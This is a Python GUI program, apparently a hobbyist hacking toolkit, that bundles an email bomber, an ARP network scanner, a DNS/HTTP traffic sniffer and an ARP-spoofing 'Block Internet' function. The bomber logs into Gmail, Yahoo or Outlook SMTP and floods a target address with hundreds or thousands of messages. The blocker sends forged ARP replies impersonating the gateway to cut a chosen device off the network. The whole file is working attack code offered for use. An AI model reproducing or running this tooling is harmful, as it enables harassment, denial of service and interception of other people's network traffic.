import smtplib
import sys
import tkinter as tk
from tkinter import messagebox
import scapy.all as scapy
import re
import threading
import os
import requests  
from scapy.layers.http import HTTPRequest  
import socket

class EmailBomberGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Email Bomber & NetScanner & Network Sniffer")
        self.create_widgets()

    def create_widgets(self):
        tk.Label(self.root, text="Choose a mode").pack(pady=10)

        self.email_bomber_button = tk.Button(self.root, text="Email Bomber", command=self.email_bomber)
        self.email_bomber_button.pack(pady=10)

        self.net_scanner_button = tk.Button(self.root, text="NetScanner", command=self.net_scanner)
        self.net_scanner_button.pack(pady=10)

        self.network_sniffer_button = tk.Button(self.root, text="Network Sniffer", command=self.network_sniffer)
        self.network_sniffer_button.pack(pady=10)

        self.device_block_button = tk.Button(self.root, text="List Devices and Block", command=self.list_devices)
        self.device_block_button.pack(pady=10)

    def email_bomber(self):
        bomber_window = tk.Toplevel(self.root)
        bomber_window.title("Email Bomber")

        tk.Label(bomber_window, text="Target Email").grid(row=0)
        tk.Label(bomber_window, text="Bomb Mode (1,2,3,4)").grid(row=1)
        tk.Label(bomber_window, text="Custom Amount (optional)").grid(row=2)
        tk.Label(bomber_window, text="Email Server (1:Gmail 2:Yahoo 3:Outlook)").grid(row=3)
        tk.Label(bomber_window, text="From Address").grid(row=4)
        tk.Label(bomber_window, text="From Password").grid(row=5)
        tk.Label(bomber_window, text="Subject").grid(row=6)
        tk.Label(bomber_window, text="Message").grid(row=7)

        target_entry = tk.Entry(bomber_window)
        mode_entry = tk.Entry(bomber_window)
        custom_amount_entry = tk.Entry(bomber_window)
        server_entry = tk.Entry(bomber_window)
        from_addr_entry = tk.Entry(bomber_window)
        from_pwd_entry = tk.Entry(bomber_window, show="*")
        subject_entry = tk.Entry(bomber_window)
        message_entry = tk.Entry(bomber_window)

        target_entry.grid(row=0, column=1)
        mode_entry.grid(row=1, column=1)
        custom_amount_entry.grid(row=2, column=1)
        server_entry.grid(row=3, column=1)
        from_addr_entry.grid(row=4, column=1)
        from_pwd_entry.grid(row=5, column=1)
        subject_entry.grid(row=6, column=1)
        message_entry.grid(row=7, column=1)

        def start_bombing():
            target = target_entry.get()
            mode = int(mode_entry.get())
            custom_amount = custom_amount_entry.get()
            server = server_entry.get()
            from_addr = from_addr_entry.get()
            from_pwd = from_pwd_entry.get()
            subject = subject_entry.get()
            message = message_entry.get()

            try:
                bomb = Email_Bomber(target, mode, custom_amount, server, from_addr, from_pwd, subject, message)
                bomb.bomb()
                bomb.email()
                bomb.attack()
            except Exception as e:
                messagebox.showerror("Error", f"An error occurred: {e}")

        tk.Button(bomber_window, text="Start Bombing", command=start_bombing).grid(row=8, column=1)

    def net_scanner(self):
        scanner_window = tk.Toplevel(self.root)
        scanner_window.title("NetScanner")

        tk.Label(scanner_window, text="Enter IP address range (ex: 192.168.1.0/24)").grid(row=0)
        ip_entry = tk.Entry(scanner_window)
        ip_entry.grid(row=0, column=1)

        def scan_network():
            ip_range = ip_entry.get()
            ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
            if ip_add_range_pattern.search(ip_range):
                try:
                    scapy.arping(ip_range)
                except Exception as e:
                    messagebox.showerror("Error", f"An error occurred: {e}")
            else:
                messagebox.showerror("Invalid Input", "Please enter a valid IP address range.")

        tk.Button(scanner_window, text="Start Scanning", command=scan_network).grid(row=1, column=1)

    def network_sniffer(self):
        sniffer_window = tk.Toplevel(self.root)
        sniffer_window.title("Network Sniffer")

        tk.Label(sniffer_window, text="Select Interface to Sniff").grid(row=0)

        interfaces = scapy.get_if_list()
        interface_var = tk.StringVar(sniffer_window)
        interface_var.set(interfaces[0])

        interface_menu = tk.OptionMenu(sniffer_window, interface_var, *interfaces)
        interface_menu.grid(row=0, column=1)

        def start_sniffing():
            selected_interface = interface_var.get()

            sniff_window = tk.Toplevel(sniffer_window)
            sniff_window.title(f"Sniffing on {selected_interface}")
            sniff_output = tk.Text(sniff_window, height=20, width=80)
            sniff_output.grid(row=0, column=0, padx=10, pady=10)
            sniff_output.insert(tk.END, f"Sniffing on {selected_interface}...\n")

            stop_sniffing = False

            def process_packet(packet):
                if packet.haslayer(scapy.DNSRR):  # DNS yanıtlarını dinle
                    domain_name = packet[scapy.DNSRR].rrname.decode('utf-8')
                    sniff_output.insert(tk.END, f"DNS Response: {domain_name}\n")
                    sniff_output.see(tk.END)
                elif packet.haslayer(HTTPRequest):  # HTTP İsteklerini dinle
                    host = packet[HTTPRequest].Host.decode('utf-8')
                    sniff_output.insert(tk.END, f"HTTP Request Host: {host}\n")
                    sniff_output.see(tk.END)

            def stop():
                nonlocal stop_sniffing
                stop_sniffing = True
                sniff_output.insert(tk.END, "Sniffing stopped.\n")

            def start_sniffing_thread():
                try:
                    scapy.sniff(iface=selected_interface, store=False, prn=process_packet, stop_filter=lambda x: stop_sniffing)
                except Exception as e:
                    messagebox.showerror("Error", f"An error occurred: {e}")

            sniff_thread = threading.Thread(target=start_sniffing_thread)
            sniff_thread.start()

            tk.Button(sniff_window, text="Stop Sniffing", command=stop).grid(row=1, column=0)

        tk.Button(sniffer_window, text="Start Sniffing", command=start_sniffing).grid(row=1, column=1)
  

    def list_devices(self):
        device_window = tk.Toplevel(self.root)
        device_window.title("Devices on the Network")

        def get_gateway_ip():
            return scapy.conf.route.route("0.0.0.0")[2]

        def get_local_ip():
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)

        gateway_ip = get_gateway_ip() 
        local_ip = get_local_ip()  

        tk.Label(device_window, text=f"Detected Gateway IP: {gateway_ip}").grid(row=0, column=0, columnspan=2)
        tk.Label(device_window, text=f"Your Local IP: {local_ip}").grid(row=1, column=0, columnspan=2)

        tk.Label(device_window, text="Enter IP Range (ex: 192.168.1.0/24):").grid(row=2, column=0)
        ip_range_entry = tk.Entry(device_window)
        ip_range_entry.grid(row=2, column=1)

        device_list = tk.Listbox(device_window, height=15, width=50)
        device_list.grid(row=3, column=0, padx=10, pady=10, columnspan=2)

        def get_mac_vendor(mac):
            try:
                url = f"https://api.macvendors.com/{mac}"
                response = requests.get(url)
                if response.status_code == 200:
                    return response.text
                else:
                    return "Unknown Vendor"
            except requests.RequestException:
                return "Unknown Vendor"

        def block_device():
            selected_device = device_list.get(tk.ACTIVE)
            ip_address = selected_device.split(" - ")[0]  
            mac_address = selected_device.split(" - ")[1]  

            try:
                arp_response = scapy.ARP(op=2, pdst=ip_address, hwdst=mac_address, psrc=gateway_ip)
                scapy.send(arp_response, count=4, verbose=False)
                messagebox.showinfo("Action", f"Internet access for {selected_device} has been blocked.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to block device: {e}")

        def scan_network():
            ip_range = ip_range_entry.get()  
            try:
                result = scapy.arping(ip_range, timeout=2, verbose=False)[0]  
                for sent, received in result:
                    mac_vendor = get_mac_vendor(received.hwsrc)  
                    device_list.insert(tk.END, f"{received.psrc} - {received.hwsrc} - {mac_vendor}")
            except Exception as e:
                messagebox.showerror("Error", f"Network scan failed: {e}")

        scan_button = tk.Button(device_window, text="Scan Network", command=scan_network)
        scan_button.grid(row=4, column=0, pady=10)

        block_button = tk.Button(device_window, text="Block Internet", command=block_device)
        block_button.grid(row=4, column=1, pady=10)


class Email_Bomber:
    count = 0

    def __init__(self, target, mode, custom_amount, server, from_addr, from_pwd, subject, message):
        print('\n+[+[+[ Initializing program ]+]+]+')
        self.target = target
        self.mode = mode
        self.custom_amount = custom_amount
        self.server = server
        self.fromAddr = from_addr
        self.fromPwd = from_pwd
        self.subject = subject
        self.message = message

    def bomb(self):
        print('\n+[+[+[ Setting up bomb ]+]+]+')
        self.amount = None
        if self.mode == int(1):
            self.amount = int(1000)
        elif self.mode == int(2):
            self.amount = int(500)
        elif self.mode == int(3):
            self.amount = int(250)
        else:
            self.amount = int(self.custom_amount)

    def email(self):
        print('\n+[+[+[ Setting up email ]+]+]+')
        premade = ['1', '2', '3']
        default_port = True
        if self.server not in premade:
            default_port = False
            self.port = int(input('Enter port number <: '))

        if default_port:
            self.port = int(587)

        if self.server == '1':
            self.server = 'smtp.gmail.com'
        elif self.server == '2':
            self.server = 'smtp.mail.yahoo.com'
        elif self.server == '3':
            self.server = 'smtp-mail.outlook.com'

        self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
        ''' % (self.fromAddr, self.target, self.subject, self.message)

        self.s = smtplib.SMTP(self.server, self.port)
        self.s.ehlo()
        self.s.starttls()
        self.s.ehlo()
        self.s.login(self.fromAddr, self.fromPwd)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print('\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print('\n+[+[+[ Attack finished ]+]+]+')


if __name__ == "__main__":
    root = tk.Tk()
    app = EmailBomberGUI(root)
    root.mainloop()
